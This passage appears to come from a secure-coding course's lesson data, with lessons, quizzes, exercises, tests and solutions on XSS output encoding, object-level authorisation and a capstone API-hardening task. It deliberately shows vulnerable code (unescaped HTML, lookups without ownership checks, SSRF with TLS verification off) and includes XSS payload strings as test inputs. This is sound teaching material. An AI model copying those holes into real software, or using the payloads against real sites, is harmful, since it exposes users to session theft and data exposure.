None of these replace escaping. All of them reduce what a missed escape achieves.`,
        },
      ],
      spot: {
        label: "profile renderer",
        prompt: "Click the line where a user-supplied value executes in another user's browser.",
        lines: [6],
        why:
          "Line 6. `bio` is interpolated into HTML with no escaping, so `<img src=x onerror=...>` runs for every visitor. Line 5 is escaped and fine; line 7's attribute is quoted *and* escaped, which is the pattern to copy.",
        code: `from miniweb import escape

def profile_html(user):
    parts = []
    parts.append(f"<h1>{escape(user['name'])}</h1>")
    parts.append(f"<div class='bio'>{user['bio']}</div>")
    parts.append(f'<img alt="{escape(user["name"])}" src="/avatar.png">')
    return "".join(parts)`,
      },
      quiz: [
        {
          q: "Why escape at output rather than on input?",
          options: [
            "It is faster.",
            "The correct encoding depends on the destination, which is only known at render time.",
            "Input escaping is impossible.",
          ],
          answer: 1,
          why:
            "The same value may go to HTML, JSON, a log and a URL. Encoding on input produces double-encoded data and still gets the other contexts wrong.",
        },
        {
          q: "`<a href=\"{escaped_url}\">` where the URL is `javascript:alert(1)` — safe?",
          options: [
            "Yes, it is escaped.",
            "No — escaping does not change the scheme; allowlist `http`/`https`/`mailto`.",
            "Yes, browsers block `javascript:`.",
          ],
          answer: 1,
          why: "There is nothing to escape: the string is a valid URL whose scheme executes script. Validate the scheme.",
        },
        {
          q: "What does a Content-Security-Policy of `script-src 'self'` do for an XSS bug?",
          options: [
            "Removes the need to escape.",
            "Stops an injected inline script from executing, reducing the impact of a missed escape.",
            "Blocks the request entirely.",
          ],
          answer: 1,
          why: "Defence in depth. The bug is still a bug; CSP limits what it achieves.",
        },
      ],
      exercise: {
        title: "A renderer that encodes per context",
        brief: `Using \`miniweb.escape\` and \`urllib.parse.quote\`, write four context-aware helpers and one renderer.

1. \`html_text(value)\` — escape for HTML text.
2. \`html_attr(value)\` — escape for an attribute value and return it **with surrounding double quotes included**, e.g. \`html_attr('a"b')\` → \`"a&quot;b"\` (with the quotes as part of the string).
3. \`safe_href(url)\` — return the URL unchanged when its scheme is \`http\`, \`https\` or \`mailto\` (a relative URL with no scheme is also permitted); otherwise return \`"#"\`.
4. \`js_value(value)\` — return \`json.dumps(value)\` with \`<\`, \`>\` and \`&\` replaced by their \`\\u003c\`-style escapes, so the string cannot close a \`<script>\` block.
5. \`render_profile(user)\` — build:

\`\`\`
<h1>NAME</h1><p class="bio">BIO</p><a href="URL">site</a><script>var u = JS;</script>
\`\`\`

where \`NAME\` and \`BIO\` are HTML-escaped text, \`URL\` goes through \`safe_href\` with the attribute quoted, and \`JS\` is \`js_value(user["name"])\`.

The result must contain no executable payload for any input.`,
        rubric: [
          "HTML text and attributes are escaped",
          "`javascript:` and `data:` URLs become `#`",
          "Relative URLs are permitted",
          "`js_value` cannot close a script block",
          "`render_profile` neutralises a payload in every field",
        ],
        starter: `import json
from urllib.parse import urlparse

from miniweb import escape, is_safe_html

SAFE_SCHEMES = ("http", "https", "mailto")


def html_text(value):
    """Escape for HTML text content."""


def html_attr(value):
    """Escape for an attribute, including the surrounding double quotes."""


def safe_href(url):
    """Return the URL when its scheme is allowlisted, or '#'. Validation only."""


def js_value(value):
    """JSON, with the characters that could close a script block escaped."""


def render_profile(user):
    """Render a profile with the correct encoding in every context."""


print(render_profile({"name": "Ada", "bio": "builder", "url": "https://ada.example"}))
`,
        stdin: [],
        tests: [
          {
            name: "html text is escaped",
            code: `assert html_text("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;"
assert html_text("a & b") == "a &amp; b"
assert html_text("plain") == "plain"`,
          },
          {
            name: "attributes are escaped and quoted",
            code: `got = html_attr('a"b')
assert got.startswith('"') and got.endswith('"'), f"include the quotes: {got!r}"
assert "&quot;" in got, f"got {got!r}"
assert '"' not in got[1:-1], f"an unescaped quote can break out: {got!r}"
got2 = html_attr("x onmouseover=alert(1)")
assert got2 == '"x onmouseover=alert(1)"', f"got {got2!r}"`,
          },
          {
            name: "dangerous schemes become #",
            code: `for bad in ("javascript:alert(1)", "JavaScript:alert(1)", "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox", "  javascript:alert(1)"):
    assert safe_href(bad) == "#", f"{bad!r} returned {safe_href(bad)!r}"`,
          },
          {
            name: "ordinary and relative urls survive",
            code: `assert safe_href("https://ada.example/x") == "https://ada.example/x"
assert safe_href("http://ada.example") == "http://ada.example"
assert safe_href("mailto:ada@example.com") == "mailto:ada@example.com"
assert safe_href("/profile/7") == "/profile/7"
assert safe_href("") == ""`,
          },
          {
            name: "js_value cannot close a script block",
            code: `got = js_value("</script><script>alert(1)</script>")
assert "</script>" not in got, f"got {got!r}"
assert "\\\\u003c" in got, f"expected unicode escapes: {got!r}"
import json
assert json.loads(got) == "</script><script>alert(1)</script>", "it must still be valid JSON"`,
          },
          {
            name: "a hostile profile renders inert",
            code: `user = {"name": "<script>alert(1)</script>",
        "bio": "<img src=x onerror=alert(2)>",
        "url": "javascript:alert(3)"}
html = render_profile(user)
assert "<script>alert(1)" not in html, f"name executed: {html!r}"
assert "onerror=alert(2)" not in html or "&lt;img" in html, f"bio executed: {html!r}"
assert "javascript:" not in html, f"href executed: {html!r}"
assert 'href="#"' in html, f"the bad url should become #: {html!r}"`,
          },
          {
            name: "an ordinary profile renders correctly",
            code: `html = render_profile({"name": "Ada", "bio": "builder of engines", "url": "https://ada.example"})
assert "<h1>Ada</h1>" in html, f"got {html!r}"
assert 'class="bio"' in html and "builder of engines" in html
assert 'href="https://ada.example"' in html, f"got {html!r}"
assert "var u = " in html`,
          },
          {
            name: "the quote character cannot escape an attribute",
            code: `html = render_profile({"name": "x", "bio": "y", "url": 'https://a.example" onload="alert(1)'})
assert ' onload=' not in html or "&quot;" in html, f"attribute broken out of: {html!r}"`,
          },
        ],
        requirements: [
          { kind: "defines", value: "render_profile" },
          { kind: "calls", value: "escape" },
          { kind: "no_finding", value: "PY-XSS-MARKUP" },
        ],
        hints: [
          "`miniweb.escape` handles `& < > \" '` — that covers both the text and attribute cases; the attribute case adds the surrounding quotes.",
          "`safe_href`: `scheme = urlparse(url.strip()).scheme.lower()` then permit `\"\"` (relative) plus the allowlist. Strip first, or a leading space hides the scheme from `urlparse`.",
          "`js_value`: `json.dumps(value).replace(\"<\", \"\\\\u003c\")` and the same for `>` and `&`. The result is still valid JSON because those escapes are legal inside a JSON string.",
          "Build the HTML by concatenating already-encoded pieces, so there is no step where a raw value touches the markup.",
        ],
        solution: `import json
from urllib.parse import urlparse

from miniweb import escape, is_safe_html

SAFE_SCHEMES = ("http", "https", "mailto")
JS_ESCAPES = {"<": "\\\\u003c", ">": "\\\\u003e", "&": "\\\\u0026"}


def html_text(value):
    """Escape for HTML text content."""
    return escape(value)


def html_attr(value):
    """Escape for an attribute, including the surrounding double quotes."""
    return '"' + escape(value) + '"'


def safe_href(url):
    """Return the URL when its scheme is allowlisted, or '#'. Validation only."""
    candidate = str(url).strip()
    scheme = urlparse(candidate).scheme.lower()

    if scheme and scheme not in SAFE_SCHEMES:
        return "#"
    return candidate          # validated, NOT encoded: html_attr does that once


def js_value(value):
    """JSON, with the characters that could close a script block escaped."""
    out = json.dumps(value)
    for char, replacement in JS_ESCAPES.items():
        out = out.replace(char, replacement)
    return out


def render_profile(user):
    """Render a profile with the correct encoding in every context."""
    name = html_text(user.get("name", ""))
    bio = html_text(user.get("bio", ""))
    href = html_attr(safe_href(user.get("url", "")))
    script_value = js_value(str(user.get("name", "")))

    return (
        f"<h1>{name}</h1>"
        f'<p class="bio">{bio}</p>'
        f"<a href={href}>site</a>"
        f"<script>var u = {script_value};</script>"
    )


print(render_profile({"name": "Ada", "bio": "builder", "url": "https://ada.example"}))`,
        why: `Four destinations, four encoders, and the renderer never touches a raw value — every interpolation in the f-string is a call to one of them. That structure is what makes the function reviewable: a reader checks that each hole is filled by an encoder, without having to reason about any particular payload.

\`html_attr\` returning the quotes as part of its output is a deliberate piece of API design. The common failure is not forgetting to escape but forgetting to *quote*: \`<div class={value}>\` needs no quote character to break out of, so \`x onmouseover=alert(1)\` becomes two attributes. Making the quotes inseparable from the encoder means the call site cannot omit them.

\`safe_href\` validates rather than escapes, because there is nothing to escape — \`javascript:alert(1)\` contains no special characters. Only the scheme matters, and \`.strip()\` before parsing closes the leading-whitespace trick that hides a scheme from \`urlparse\`. Permitting an empty scheme keeps relative URLs working, which is what makes the function usable enough that nobody bypasses it.

\`js_value\` solves a problem HTML escaping cannot touch. Inside a \`<script>\` block the browser's HTML parser is still looking for \`</script>\`, so a JSON string containing that sequence terminates the block early and everything after it is markup. Escaping \`<\`, \`>\` and \`&\` as \`\\u003c\`-style sequences keeps the value valid JSON while making the closing tag unrepresentable.

The general lesson is in the table rather than the code: autoescaping in a template engine covers the HTML-text case and nothing else. URL schemes, script blocks and CSS remain the developer's responsibility in every framework.`,
      },
      wrapup: `- Escape at output, for the destination context. Store values raw.
- Autoescaping covers HTML text; URLs, script blocks and CSS are still yours.
- Quote attributes and make the quotes part of the encoder's output.
- \`Markup()\` and \`|safe\` are explicit decisions to turn escaping off.`,
      refs: [
        { label: "OWASP XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { label: "CWE-79: Cross-site Scripting", url: "https://cwe.mitre.org/data/definitions/79.html" },
      ],
    },

    /* ----------------------------------------------------------------- 49 */
    {
      id: "m10l04",
      day: 49,
      title: "Authorisation per object, not per route",
      minutes: 60,
      secure: "object-level access control",
      cwe: ["CWE-639", "CWE-862", "CWE-285"],
      tags: ["idor", "authz", "access-control", "api"],
      lede:
        "`@login_required` answers *is someone logged in*. The question that matters is *may **this** user touch **this** object* — and it has to be asked on every single read and write.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          code: `@login_required
def get_invoice(request, invoice_id):
    invoice = db.invoices.get(invoice_id)      # any id, any customer
    return invoice.to_json()`,
          cap: "Authenticated, and completely broken. Changing `invoice_id` in the URL walks the entire invoice table. This is {{IDOR}} — insecure direct object reference.",
        },
        {
          t: "code",
          label: "fixed",
          code: `@login_required
def get_invoice(request, invoice_id):
    invoice = db.invoices.get(invoice_id)
    if invoice is None or invoice.customer_id != request.user.customer_id:
        raise NotFound()               # 404, not 403: do not confirm existence
    return invoice.to_json()`,
          cap: "The ownership check and the 404-for-everything response are both required. A 403 for someone else's invoice confirms that the id exists.",
        },
        {
          t: "box",
          kind: "rule",
          title: "Scope the query, do not filter the result",
          md: `Better than checking after fetching is making the unauthorised row unfetchable:

\`\`\`
invoice = db.invoices.get(id=invoice_id, customer_id=request.user.customer_id)
\`\`\`

The ownership constraint is now part of the query. A developer who forgets the check cannot forget it here, because without it the query does not compile into anything meaningful.

This is why "every query is scoped by tenant" is a stronger architectural rule than "every handler checks ownership".`,
        },
        {
          t: "table",
          head: ["Layer", "Question", "Failure name"],
          rows: [
            ["Authentication", "Who are you?", "—"],
            ["Route authorisation", "May you call this endpoint at all?", "CWE-862 missing authorisation"],
            ["**Object authorisation**", "May you touch *this* record?", "**CWE-639 IDOR**"],
            ["Field authorisation", "May you write *this field*?", "CWE-915 mass assignment"],
            ["Response filtering", "May you see *this field*?", "Excessive data exposure"],
          ],
        },
        {
          t: "box",
          kind: "cve",
          title: "Why this is the top API risk",
          md: `Broken Object Level Authorisation is **API1** in the OWASP API Security Top 10, in both the 2019 and 2023 editions. It is the most reported bug class in API bug-bounty programmes.

The reason is structural: route authorisation is centralised in a decorator or middleware and therefore hard to forget, while object authorisation lives in each handler and must be written correctly every time.`,
        },
        {
          t: "box",
          kind: "pitfall",
          title: "Sequential ids make it trivial to exploit",
          md: `\`/invoices/1042\` invites \`/invoices/1043\`. UUIDs do not fix the authorisation bug — they only make enumeration slower, and ids leak through emails, logs, referrers and exports.

Use unguessable ids *and* check ownership. One without the other is obscurity or friction, not a control.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `def list_documents(request):
    """Collections need scoping too -- this is where it is forgotten."""
    return db.documents.filter(owner_id=request.user.id).limit(100)

def bulk_delete(request, ids):
    """And bulk operations need it per item, not per request."""
    owned = db.documents.filter(id__in=ids, owner_id=request.user.id)
    if len(owned) != len(set(ids)):
        raise NotFound()               # one unowned id fails the whole batch
    db.documents.delete(owned)`,
        },
      ],
      spot: {
        label: "document API",
        prompt: "Click the line that lets any logged-in user read any document.",
        lines: [4],
        why:
          "Line 4 fetches by id alone, and line 5 returns it with no ownership check. Scope the lookup — `store.get((doc_id, user['id']))` or a filter on `owner_id` — so an unowned document is simply not found.",
        code: `def get_document(store, user, doc_id):
    if not user:
        raise PermissionError("login required")
    doc = store.get(doc_id)
    return {"id": doc["id"], "title": doc["title"], "body": doc["body"]}`,
      },
      quiz: [
        {
          q: "`@login_required` on every endpoint. Are you protected against IDOR?",
          options: [
            "Yes.",
            "No — authentication says who you are, not which objects you may touch.",
            "Only for POST.",
          ],
          answer: 1,
          why: "Object-level authorisation is a separate check, required on every read and write of a specific record.",
        },
        {
          q: "Someone requests another customer's invoice. Return 403 or 404?",
          options: [
            "403 — it is accurate.",
            "404 — a 403 confirms the id exists, which is an enumeration oracle.",
            "500.",
          ],
          answer: 1,
          why: "Make 'not yours' and 'not there' indistinguishable, exactly as with login failures.",
        },
        {
          q: "Why is scoping the query better than checking after fetching?",
          options: [
            "It is faster.",
            "The constraint cannot be forgotten — without it the query returns nothing useful.",
            "It avoids SQL injection.",
          ],
          answer: 1,
          why:
            "It converts a rule someone must remember into a structure that fails loudly when omitted. (It is also faster, but that is incidental.)",
        },
      ],
      exercise: {
        title: "A document API with object-level authorisation",
        brief: `Implement a small API over this store (provided):

\`\`\`
DOCS = {1: {"id": 1, "owner_id": 7, "title": "Q4", "body": "...", "internal_note": "..."},
        2: {"id": 2, "owner_id": 7, "title": "Q3", "body": "...", "internal_note": "..."},
        3: {"id": 3, "owner_id": 9, "title": "merger", "body": "...", "internal_note": "..."}}
\`\`\`

A \`user\` is \`None\` (anonymous) or \`{"id": int, "role": "member"|"admin"}\`.

1. \`get_document(store, user, doc_id)\` — return the **public view** \`{"id", "title", "body"}\`. Raise \`PermissionError("login required")\` when \`user\` is \`None\`. Raise \`LookupError("not found")\` when the document does not exist **or** is not the user's — identically, with the same message. Admins may read any document.
2. \`list_documents(store, user, *, limit=50)\` — the user's own documents only (admins see all), sorted by id, capped at \`limit\` (clamped to 1–100), each as a public view.
3. \`update_document(store, user, doc_id, fields)\` — only \`"title"\` and \`"body"\` are writable; anything else raises \`ValueError\` listing the rejected keys sorted. \`title\` is truncated to 80 characters, \`body\` to 1000. Ownership rules are identical to \`get_document\`. Returns the updated public view.
4. \`delete_documents(store, user, ids)\` — delete several by id; if **any** id is missing or not the user's, raise \`LookupError("not found")\` and delete **nothing**. Returns the number deleted.

\`internal_note\` and \`owner_id\` must never appear in any returned value.`,
        rubric: [
          "Anonymous access raises `PermissionError`; cross-tenant access raises `LookupError` with the same message as a missing id",
          "Admins may read and write anything",
          "Only `title` and `body` are writable; other fields are refused by name",
          "`internal_note` and `owner_id` never leave the API",
          "A bulk delete containing one unowned id deletes nothing",
        ],
        starter: `PUBLIC_FIELDS = ("id", "title", "body")
WRITABLE = ("title", "body")
MAX_TITLE, MAX_BODY = 80, 1000

DOCS = {
    1: {"id": 1, "owner_id": 7, "title": "Q4", "body": "revenue up", "internal_note": "do not share"},
    2: {"id": 2, "owner_id": 7, "title": "Q3", "body": "revenue flat", "internal_note": "draft"},
    3: {"id": 3, "owner_id": 9, "title": "merger", "body": "confidential", "internal_note": "legal only"},
}


def public_view(doc):
    """Only the fields a client may see."""


def get_document(store, user, doc_id):
    """Fetch one document the user is entitled to."""


def list_documents(store, user, *, limit=50):
    """List the user's documents."""


def update_document(store, user, doc_id, fields):
    """Update the writable fields of a document the user owns."""


def delete_documents(store, user, ids):
    """All-or-nothing delete."""


print(get_document(DOCS, {"id": 7, "role": "member"}, 1))
`,
        stdin: [],
        tests: [
          {
            name: "owners read their own documents",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = get_document(store, {"id": 7, "role": "member"}, 1)
assert got == {"id": 1, "title": "Q4", "body": "revenue up"}, f"got {got!r}"`,
          },
          {
            name: "anonymous access is refused distinctly",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
with raises(PermissionError):
    get_document(store, None, 1)
with raises(PermissionError):
    list_documents(store, None)`,
          },
          {
            name: "cross-tenant and missing are indistinguishable",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
msgs = set()
for doc_id in (3, 999):
    try:
        get_document(store, user, doc_id)
        raise AssertionError(f"{doc_id} should have been refused")
    except LookupError as e:
        msgs.add(str(e))
assert msgs == {"not found"}, f"messages differ: {msgs!r}"`,
          },
          {
            name: "admins see everything",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
admin = {"id": 1, "role": "admin"}
assert get_document(store, admin, 3)["title"] == "merger"
assert len(list_documents(store, admin)) == 3`,
          },
          {
            name: "listing is scoped, sorted and capped",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = list_documents(store, {"id": 7, "role": "member"})
assert [d["id"] for d in got] == [1, 2], f"got {got!r}"
assert all(set(d) == {"id", "title", "body"} for d in got), f"leaked fields: {got!r}"
assert len(list_documents(store, {"id": 7, "role": "member"}, limit=1)) == 1
assert len(list_documents(store, {"id": 1, "role": "admin"}, limit=0)) == 1, "limit clamps to at least 1"`,
          },
          {
            name: "internal fields never leave",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
blob = str(get_document(store, user, 1)) + str(list_documents(store, user))
for leak in ("internal_note", "owner_id", "do not share", "draft"):
    assert leak not in blob, f"{leak!r} leaked: {blob!r}"`,
          },
          {
            name: "updates are field-scoped and ownership-checked",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
got = update_document(store, user, 1, {"title": "Q4 final"})
assert got["title"] == "Q4 final" and store[1]["title"] == "Q4 final"
try:
    update_document(store, user, 1, {"owner_id": 7, "internal_note": "x"})
    raise AssertionError("expected ValueError")
except ValueError as e:
    assert "internal_note" in str(e) and "owner_id" in str(e), f"got {str(e)!r}"
assert store[1]["owner_id"] == 7, "the store was modified despite the error"
with raises(LookupError):
    update_document(store, user, 3, {"title": "hijack"})
assert store[3]["title"] == "merger"`,
          },
          {
            name: "values are truncated",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
got = update_document(store, user, 1, {"title": "x" * 200, "body": "y" * 5000})
assert len(got["title"]) == 80 and len(got["body"]) == 1000, f"got {len(got['title'])}/{len(got['body'])}"`,
          },
          {
            name: "bulk delete is all-or-nothing",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
user = {"id": 7, "role": "member"}
with raises(LookupError):
    delete_documents(store, user, [1, 3])
assert set(store) == {1, 2, 3}, f"a partial delete happened: {sorted(store)}"
with raises(LookupError):
    delete_documents(store, user, [1, 999])
assert set(store) == {1, 2, 3}
assert delete_documents(store, user, [1, 2]) == 2
assert set(store) == {3}`,
          },
        ],
        requirements: [
          { kind: "defines", value: "get_document" },
          { kind: "defines", value: "delete_documents" },
        ],
        hints: [
          "Write one private helper, `_owned(store, user, doc_id)`, that raises `PermissionError` for anonymous, `LookupError(\"not found\")` for missing-or-unowned, and otherwise returns the record. Every public function starts with it.",
          "Admin handling goes inside that helper: `if user[\"role\"] != \"admin\" and doc[\"owner_id\"] != user[\"id\"]: raise LookupError(\"not found\")`.",
          "`public_view` builds a new dict from `PUBLIC_FIELDS`, so a field added to the store later is invisible by default — the Module 3 selection rule.",
          "For the all-or-nothing delete, resolve every id through `_owned` first, collecting the records, and only then delete. Validate everything, mutate nothing until the end.",
        ],
        solution: `PUBLIC_FIELDS = ("id", "title", "body")
WRITABLE = ("title", "body")
MAX_TITLE, MAX_BODY = 80, 1000
LIMITS = {"title": MAX_TITLE, "body": MAX_BODY}

DOCS = {
    1: {"id": 1, "owner_id": 7, "title": "Q4", "body": "revenue up", "internal_note": "do not share"},
    2: {"id": 2, "owner_id": 7, "title": "Q3", "body": "revenue flat", "internal_note": "draft"},
    3: {"id": 3, "owner_id": 9, "title": "merger", "body": "confidential", "internal_note": "legal only"},
}


def public_view(doc):
    """Only the fields a client may see."""
    return {field: doc[field] for field in PUBLIC_FIELDS if field in doc}


def _require_user(user):
    if not user:
        raise PermissionError("login required")
    return user


def _owned(store, user, doc_id):
    """Return the record, or fail in a way that reveals nothing."""
    _require_user(user)
    doc = store.get(doc_id)

    if doc is None:
        raise LookupError("not found")
    if user.get("role") != "admin" and doc.get("owner_id") != user.get("id"):
        raise LookupError("not found")      # identical to 'missing', on purpose
    return doc


def get_document(store, user, doc_id):
    """Fetch one document the user is entitled to."""
    return public_view(_owned(store, user, doc_id))


def list_documents(store, user, *, limit=50):
    """List the user's documents."""
    _require_user(user)
    limit = max(1, min(int(limit), 100))

    visible = [
        doc for doc in store.values()
        if user.get("role") == "admin" or doc.get("owner_id") == user.get("id")
    ]
    visible.sort(key=lambda d: d["id"])
    return [public_view(doc) for doc in visible[:limit]]


def update_document(store, user, doc_id, fields):
    """Update the writable fields of a document the user owns."""
    if not isinstance(fields, dict):
        raise ValueError("fields must be an object")

    unknown = set(fields) - set(WRITABLE)
    if unknown:
        raise ValueError(f"not writable: {sorted(unknown)}")

    doc = _owned(store, user, doc_id)

    clean = {}
    for key, value in fields.items():
        if not isinstance(value, str):
            raise ValueError(f"{key} must be text")
        clean[key] = value[:LIMITS[key]]

    doc.update(clean)
    return public_view(doc)


def delete_documents(store, user, ids):
    """All-or-nothing delete."""
    _require_user(user)

    targets = [_owned(store, user, doc_id) for doc_id in ids]   # raises before any delete

    for doc in targets:
        store.pop(doc["id"], None)
    return len(targets)


print(get_document(DOCS, {"id": 7, "role": "member"}, 1))`,
        why: `\`_owned\` is the whole design. Every entry point goes through it, so the ownership rule exists once and cannot drift between handlers — and when the rule changes (a sharing feature, a team hierarchy), there is exactly one function to change.

Three decisions inside it are the security content:

- **Missing and unowned raise the identical error.** A distinct 403 for "someone else's document" confirms the id exists, which turns the endpoint into an enumeration oracle: an attacker walks the id space and learns how many documents you hold and when they were created.
- **Anonymous is distinguished from unauthorised.** \`PermissionError\` for "not logged in" is safe to disclose — the client already knows whether it sent a session — and it is the signal a front end needs to redirect to login. Collapsing it into \`LookupError\` would be more opaque and less useful without being more secure.
- **Admin is checked inside the helper, not in each handler.** A role check sprinkled across four functions is a role check that will be missing from the fifth.

\`delete_documents\` resolves every id through \`_owned\` *before* deleting anything. Written the obvious way — loop, check, delete — a request for \`[1, 3]\` deletes document 1 and then fails, which is a partial mutation driven by an unauthorised request. Collecting first makes the operation atomic in the only sense available here.

\`public_view\` applies Module 3's selection rule at the API boundary: the response is built from a tuple of permitted fields, so \`internal_note\` and \`owner_id\` are invisible, and so is whatever field gets added to the store next year.`,
      },
      wrapup: `- Authentication, route authorisation and object authorisation are three separate checks.
- Scope the query by owner so the check cannot be forgotten.
- Return the same error for "not found" and "not yours".
- Validate every id in a bulk operation before mutating anything.`,
      refs: [
        { label: "OWASP API Security Top 10 — API1 BOLA", url: "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" },
        { label: "CWE-639: Authorization Bypass Through User-Controlled Key", url: "https://cwe.mitre.org/data/definitions/639.html" },
      ],
    },

    /* ----------------------------------------------------------------- 50 */
    {
      id: "m10l05",
      day: 50,
      title: "Capstone: fix a vulnerable API",
      minutes: 60,
      secure: "end-to-end hardening",
      cwe: ["CWE-639", "CWE-79", "CWE-918", "CWE-915"],
      tags: ["capstone", "api", "idor", "xss", "ssrf", "mass-assignment"],
      lede:
        "One handler, five vulnerabilities, each from a different lesson in this module. Find them, fix them, and prove each fix with a test.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          code: `def handle_update(store, user, body):
    doc = store[body["id"]]                                   # 1
    doc.update(body)                                          # 2
    html = f"<h1>{doc['title']}</h1>"                          # 3
    preview = requests.get(body["callback"], verify=False).text  # 4, 5
    return {"html": html, "preview": preview, "doc": doc}      # 6`,
          cap: "1 IDOR · 2 mass assignment · 3 XSS · 4 SSRF · 5 TLS verification off (and no timeout) · 6 internal fields in the response.",
        },
        {
          t: "table",
          head: ["#", "Vulnerability", "Fix", "Proved by"],
          rows: [
            ["1", "IDOR", "Scope the lookup by owner", "Another user's id raises, identically to a missing one"],
            ["2", "Mass assignment", "Allowlist writable fields", "`owner_id` in the body is refused"],
            ["3", "XSS", "Escape at output", "A script payload renders inert"],
            ["4", "SSRF", "Allowlist scheme, host, address range", "The metadata URL is refused and `WORLD` stays clean"],
            ["5", "TLS / timeout", "Default verification, explicit timeout", "No `tls-mitm` event"],
            ["6", "Excessive exposure", "Build the response from a field allowlist", "`internal_note` never appears"],
          ],
        },
        {
          t: "box",
          kind: "rule",
          title: "Order the work by blast radius",
          md: `IDOR and SSRF give an attacker *other people's data* and *your internal network*. XSS gives them a session. Excessive exposure gives them intelligence.

When you cannot fix everything today, fix in that order — and write the test first, so the fix cannot silently regress.`,
        },
        {
          t: "box",
          kind: "good",
          title: "The shape of a hardened handler",
          md: `1. **Authenticate** — is there a user?
2. **Validate** — is the body well-formed, bounded, and of the right types?
3. **Authorise** — may this user touch this object?
4. **Act** — apply only the permitted fields.
5. **Render** — build the response from an allowlist, escaping per context.

Every step before the mutation. Every output through an encoder.`,
        },
      ],
      quiz: [
        {
          q: "Which of the five bugs gives the attacker access to your internal network?",
          options: ["XSS", "SSRF", "Mass assignment"],
          answer: 1,
          why: "SSRF turns your server into a proxy for destinations only it can reach — metadata services, admin ports, internal databases.",
        },
        {
          q: "Where does authorisation go relative to validation?",
          options: [
            "Before validation.",
            "After validation and before mutation.",
            "After mutation.",
          ],
          answer: 1,
          why:
            "Validate the shape cheaply first so authorisation operates on well-formed input, and authorise before any state changes. Both must precede the write.",
        },
        {
          q: "Why write the test before the fix?",
          options: [
            "It is faster.",
            "It proves the vulnerability exists and then that the fix holds, and it fails if a later change reopens it.",
            "Tests cannot be written afterwards.",
          ],
          answer: 1,
          why: "A security fix without a regression test is a fix with a half-life.",
        },
      ],
      exercise: {
        title: "handle_update(): close all six",
        brief: `Rewrite the vulnerable handler. The store and users are as in the previous lesson.

\`handle_update(store, user, body)\` where \`body\` is a client-supplied dict:

1. **Authenticate** — \`user\` falsy → \`PermissionError("login required")\`.
2. **Validate** — \`body\` must be a dict with an \`int\` \`"id"\` (reject \`bool\`), else \`ValueError("malformed request")\`. Unknown keys beyond \`"id"\`, \`"title"\`, \`"body"\`, \`"callback"\` → \`ValueError\` listing them sorted, e.g. \`"not writable: ['internal_note', 'owner_id']"\`.
3. **Authorise** — the document must exist and belong to \`user\` (admins may touch any), else \`LookupError("not found")\`.
4. **Act** — apply \`title\` (≤ 80 chars) and \`body\` (≤ 1000 chars) if present; both must be strings.
5. **Fetch** — if \`"callback"\` is present, it must be an \`https\` URL on an allowlisted host (\`api.example.com\`, \`status.example.com\`), fetched with an explicit timeout, \`allow_redirects=False\` and certificate verification **on**. A rejected URL raises \`ValueError("callback not permitted")\`; a failed fetch sets \`preview\` to \`None\` rather than failing the update.
6. **Render** — return \`{"doc": <public view>, "html": <escaped title in an h1>, "preview": <dict or None>}\`. \`internal_note\` and \`owner_id\` must not appear anywhere.

After any hostile request, \`WORLD.breached\` must be \`False\`.`,
        rubric: [
          "Anonymous, cross-tenant and unknown-field requests each fail with their own error",
          "A hostile title renders escaped",
          "The metadata URL is refused and no SSRF is recorded",
          "A failed but permitted callback degrades to `preview: None`",
          "`internal_note` and `owner_id` never appear in the response",
          "No `verify=False`, no missing timeout",
        ],
        starter: `import requests
from urllib.parse import urlparse

from miniweb import escape

PUBLIC_FIELDS = ("id", "title", "body")
ACCEPTED_KEYS = ("id", "title", "body", "callback")
WRITABLE = ("title", "body")
LIMITS = {"title": 80, "body": 1000}
ALLOWED_HOSTS = frozenset({"api.example.com", "status.example.com"})

DOCS = {
    1: {"id": 1, "owner_id": 7, "title": "Q4", "body": "revenue up", "internal_note": "do not share"},
    3: {"id": 3, "owner_id": 9, "title": "merger", "body": "confidential", "internal_note": "legal only"},
}


def handle_update(store, user, body):
    """Authenticate, validate, authorise, act, fetch, render."""


print(handle_update(DOCS, {"id": 7, "role": "member"}, {"id": 1, "title": "Q4 final"})["html"])
`,
        stdin: [],
        tests: [
          {
            name: "a legitimate update works",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
got = handle_update(store, {"id": 7, "role": "member"}, {"id": 1, "title": "Q4 final"})
assert got["doc"] == {"id": 1, "title": "Q4 final", "body": "revenue up"}, f"got {got['doc']!r}"
assert got["html"] == "<h1>Q4 final</h1>", f"got {got['html']!r}"
assert got["preview"] is None
assert store[1]["title"] == "Q4 final"`,
          },
          {
            name: "authentication and authorisation",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
with raises(PermissionError):
    handle_update(store, None, {"id": 1, "title": "x"})
msgs = set()
for doc_id in (3, 999):
    try:
        handle_update(store, {"id": 7, "role": "member"}, {"id": doc_id, "title": "x"})
        raise AssertionError(f"{doc_id} should have been refused")
    except LookupError as e:
        msgs.add(str(e))
assert msgs == {"not found"}, f"messages differ: {msgs!r}"
assert store[3]["title"] == "merger", "an unauthorised update was applied"`,
          },
          {
            name: "mass assignment is refused by name",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
try:
    handle_update(store, {"id": 7, "role": "member"},
                  {"id": 1, "owner_id": 999, "internal_note": "x"})
    raise AssertionError("expected ValueError")
except ValueError as e:
    assert "internal_note" in str(e) and "owner_id" in str(e), f"got {str(e)!r}"
assert store[1]["owner_id"] == 7, "ownership was changed"`,
          },
          {
            name: "malformed requests are refused",
            code: `store = {k: dict(v) for k, v in DOCS.items()}
